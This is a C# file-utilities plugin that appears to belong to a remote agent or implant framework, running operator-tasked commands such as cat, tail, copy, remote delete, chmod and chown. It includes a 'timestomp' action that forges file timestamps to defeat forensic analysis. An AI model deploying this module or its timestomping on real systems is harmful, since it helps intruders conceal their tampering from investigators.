using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Text.Json;
using System.Runtime.InteropServices;
using System.Net;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "file-utils";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            var args = JsonSerializer.Deserialize<fileutils.FileUtilsArgs>(
                job.task.parameters);

            if (args is null)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Failed to deserialize arguments.",
                    task_id = job.task.id,
                    status = "error"
                });
                return;
            }

            try
            {
                switch (args.action)
                {
                    case "tail":
                        await ExecuteTail(args, job);
                        return;
                    default:
                        break;
                }

                string result = args.action switch
                {
                    "head" => ExecuteHead(args),
                    "touch" => ExecuteTouch(args),
                    "wc" => ExecuteWc(args),
                    "diff" => ExecuteDiff(args),
                    "link" => ExecuteLink(args),
                    "chmod" => ExecuteChmod(args),
                    "chown" => ExecuteChown(args),
                    "cat" => ExecuteCat(args),
                    "cp" => ExecuteCp(args),
                    "mv" => ExecuteMv(args),
                    "rm" => ExecuteRm(args),
                    "mkdir" => ExecuteMkdir(args),
                    "timestomp" => ExecuteTimestomp(args),
                    _ => throw new ArgumentException(
                        $"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id,
                });
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string ExecuteCat(fileutils.FileUtilsArgs args)
        {
            if (string.IsNullOrEmpty(args.path))
                throw new ArgumentException("Missing path parameter");

            if (!File.Exists(args.path))
                throw new FileNotFoundException(
                    $"File does not exist: {args.path}");

            string content = File.ReadAllText(
                args.path.Replace("\"", ""));
            return string.IsNullOrEmpty(content)
                ? string.Empty : content;
        }

        private string ExecuteCp(fileutils.FileUtilsArgs args)
        {
            if (string.IsNullOrEmpty(args.source)
                || string.IsNullOrEmpty(args.destination))
                throw new ArgumentException(
                    "Missing required parameters (source, destination)");

            string source = args.source.Replace("\"", "");
            string destination = args.destination.Replace("\"", "");
            FileAttributes attr = File.GetAttributes(source);

            if (attr.HasFlag(FileAttributes.Directory))
            {
                if (!CopyDirectory(source, destination, true))
                    throw new Exception(
                        $"Failed to copy {source} to {destination}");
            }
            else
            {
                File.Copy(source, destination);
            }

            return $"Copied {source} to {destination}";
        }

        private string ExecuteMv(fileutils.FileUtilsArgs args)
        {
            if (string.IsNullOrEmpty(args.source)
                || string.IsNullOrEmpty(args.destination))
                throw new ArgumentException(
                    "Missing required parameters (source, destination)");

            string source = args.source.Replace("\"", "");
            string destination = args.destination.Replace("\"", "");
            FileAttributes attr = File.GetAttributes(source);

            if (attr.HasFlag(FileAttributes.Directory))
                Directory.Move(source, destination);
            else
                File.Move(source, destination);

            return $"Moved {source} to {destination}";
        }

        private string ExecuteRm(fileutils.FileUtilsArgs args)
        {
            string path = args.path;

            if (string.IsNullOrEmpty(path))
                throw new ArgumentException("Missing path parameter");

            if (!string.IsNullOrEmpty(args.file))
                path = Path.Combine(path, args.file);

            if (!string.IsNullOrEmpty(args.host))
            {
                if (!args.host.Equals(
                    Dns.GetHostName(),
                    StringComparison.OrdinalIgnoreCase))
                {
                    path = Path.Combine(
                        "\\\\" + args.host, path);
                }
            }

            if (!File.Exists(path) && !Directory.Exists(path))
                throw new FileNotFoundException(
                    $"Path doesn't exist: {path}");

            FileAttributes attr = File.GetAttributes(path);
            if (attr.HasFlag(FileAttributes.Directory))
                Directory.Delete(path.Replace("\"", ""), true);
            else
                File.Delete(path.Replace("\"", ""));

            return $"{path} removed.";
        }

        private string ExecuteMkdir(fileutils.FileUtilsArgs args)
        {
            if (string.IsNullOrEmpty(args.path))
                throw new ArgumentException("No path provided.");

            DirectoryInfo dir = Directory.CreateDirectory(
                args.path.Replace("\"", ""));
            return $"Created directory {dir.FullName}";
        }

        private async Task ExecuteTail(
            fileutils.FileUtilsArgs args, ServerJob job)
        {
            if (string.IsNullOrEmpty(args.path))
            {
                messageManager.Write(
                    "Please specify a path!",
                    job.task.id, true, "error");
                return;
            }

            if (!File.Exists(args.path))
            {
                messageManager.Write(
                    "File doesn't exist!",
                    job.task.id, true, "error");
                return;
            }

            if (args.watch)
            {
                await WatchFile(
                    args, job.task.id,
                    job.cancellationtokensource.Token);
                return;
            }

            List<string> text = File.ReadLines(args.path)
                .Reverse().Take(args.lines).ToList();
            text.Reverse();

            messageManager.AddTaskResponse(new TaskResponse
            {
                completed = true,
                user_output = string.Join(
                    Environment.NewLine, text),
                task_id = job.task.id,
            });
        }

        private async Task WatchFile(
            fileutils.FileUtilsArgs args,
            string taskId,
            CancellationToken token)
        {
            using var fileStream = new FileStream(
                args.path, FileMode.Open,
                FileAccess.Read, FileShare.ReadWrite);
            using var streamReader = new StreamReader(fileStream);

            var fileContents = string.Join(
                Environment.NewLine,
                streamReader.ReadToEnd()
                    .Split(Environment.NewLine)
                    .Reverse().Take(args.lines)
                    .Reverse().ToList());

            messageManager.Write(fileContents, taskId, false);

            using var watcher = new FileSystemWatcher(
                Path.GetDirectoryName(args.path)!,
                Path.GetFileName(args.path));

            watcher.NotifyFilter =
                NotifyFilters.LastWrite | NotifyFilters.Size;

            watcher.Changed += (sender, e) =>
            {
                while (!streamReader.EndOfStream)
                {
                    messageManager.WriteLine(
                        streamReader.ReadLine()!
                            .Replace(Environment.NewLine, ""),
                        taskId, false);
                }
            };

            watcher.EnableRaisingEvents = true;

            while (!token.IsCancellationRequested)
            {
                await Task.Delay(1000);
            }
        }

        private string ExecuteTimestomp(fileutils.FileUtilsArgs args)
        {
            if (string.IsNullOrEmpty(args.source))
                throw new ArgumentException("Missing source file!");
            if (string.IsNullOrEmpty(args.destination))
                throw new ArgumentException("Missing destination file!");
            if (!File.Exists(args.source))
                throw new FileNotFoundException(
                    $"Source file doesn't exist: {args.source}");
            if (!File.Exists(args.destination))
                throw new FileNotFoundException(
                    $"Destination file doesn't exist: {args.destination}");

            DateTime ct = File.GetCreationTime(args.source);
            DateTime lwt = File.GetLastWriteTime(args.source);
            DateTime lat = File.GetLastAccessTime(args.source);

            File.SetCreationTime(args.destination, ct);
            File.SetLastWriteTime(args.destination, lwt);
            File.SetLastAccessTime(args.destination, lat);

            return $"Time attributes applied to {args.destination}\n"
                + $"  Creation Time: {ct}\n"
                + $"  Last Write Time: {lwt}\n"
                + $"  Last Access Time: {lat}";
        }

        private string ExecuteHead(fileutils.FileUtilsArgs args)
        {
            if (!File.Exists(args.path))
                throw new FileNotFoundException(
                    $"File not found: {args.path}");

            var lines = File.ReadLines(args.path).Take(args.lines);
            return string.Join(Environment.NewLine, lines);
        }

        private string ExecuteTouch(fileutils.FileUtilsArgs args)
        {
            if (File.Exists(args.path))
            {
                File.SetLastWriteTimeUtc(args.path, DateTime.UtcNow);
                return $"Updated timestamp: {args.path}";
            }
            File.Create(args.path).Dispose();
            return $"Created: {args.path}";
        }

        private string ExecuteWc(fileutils.FileUtilsArgs args)
        {
            if (!File.Exists(args.path))
                throw new FileNotFoundException(
                    $"File not found: {args.path}");

            int lineCount = 0;
            int wordCount = 0;
            long byteCount = new FileInfo(args.path).Length;

            foreach (var line in File.ReadLines(args.path))
            {
                lineCount++;
                wordCount += line.Split(
                    (char[])null!,
                    StringSplitOptions.RemoveEmptyEntries).Length;
            }

            return $"{lineCount} lines, {wordCount} words, "
                + $"{byteCount} bytes\t{args.path}";
        }

        private string ExecuteDiff(fileutils.FileUtilsArgs args)
        {
            if (!File.Exists(args.path))
                throw new FileNotFoundException(
                    $"File not found: {args.path}");
            if (!File.Exists(args.path2))
                throw new FileNotFoundException(
                    $"File not found: {args.path2}");

            var lines1 = File.ReadAllLines(args.path);
            var lines2 = File.ReadAllLines(args.path2);
            var diff = new List<string>();
            int maxLines = Math.Max(lines1.Length, lines2.Length);

            for (int i = 0; i < maxLines; i++)
            {
                string l1 = i < lines1.Length ? lines1[i] : "";
                string l2 = i < lines2.Length ? lines2[i] : "";
                if (l1 != l2)
                {
                    diff.Add($"@@ line {i + 1} @@");
                    if (i < lines1.Length) diff.Add($"- {l1}");
                    if (i < lines2.Length) diff.Add($"+ {l2}");
                }
            }

            return diff.Count > 0
                ? string.Join(Environment.NewLine, diff)
                : "Files are identical.";
        }

        private string ExecuteLink(fileutils.FileUtilsArgs args)
        {
            if (args.link_type == "symbolic")
                File.CreateSymbolicLink(args.path2, args.path);
            else
                throw new NotSupportedException(
                    "Hard links require platform-specific P/Invoke");

            return $"Created {args.link_type} link: "
                + $"{args.path2} -> {args.path}";
        }

        private string ExecuteChmod(fileutils.FileUtilsArgs args)
        {
            if (!OperatingSystem.IsLinux()
                && !OperatingSystem.IsMacOS())
                return "chmod is only supported on Linux/macOS";

            var mode = Convert.ToInt32(args.mode, 8);
            File.SetUnixFileMode(args.path, (UnixFileMode)mode);
            return $"Changed mode of {args.path} to {args.mode}";
        }

        [DllImport("libc", SetLastError = true)]
        private static extern int chown(
            string path, int owner, int group);

        private string ExecuteChown(fileutils.FileUtilsArgs args)
        {
            if (!OperatingSystem.IsLinux()
                && !OperatingSystem.IsMacOS())
                return "chown is only supported on Linux/macOS";

            int uid = int.Parse(args.owner);
            int gid = int.Parse(args.group);
            int result = chown(args.path, uid, gid);

            if (result != 0)
                throw new Exception(
                    $"chown failed with error code: "
                    + $"{Marshal.GetLastWin32Error()}");

            return $"Changed owner of {args.path} "
                + $"to {args.owner}:{args.group}";
        }

        private bool CopyDirectory(
            string sourceDir,
            string destinationDir,
            bool recursive)
        {
            var dir = new DirectoryInfo(sourceDir);
            if (!dir.Exists)
                return false;

            DirectoryInfo[] dirs = dir.GetDirectories();
            Directory.CreateDirectory(destinationDir);

            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(
                    destinationDir, file.Name);
                file.CopyTo(targetFilePath);
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestDir = Path.Combine(
                        destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestDir, true);
                }
            }
            return true;
        }
    }
}
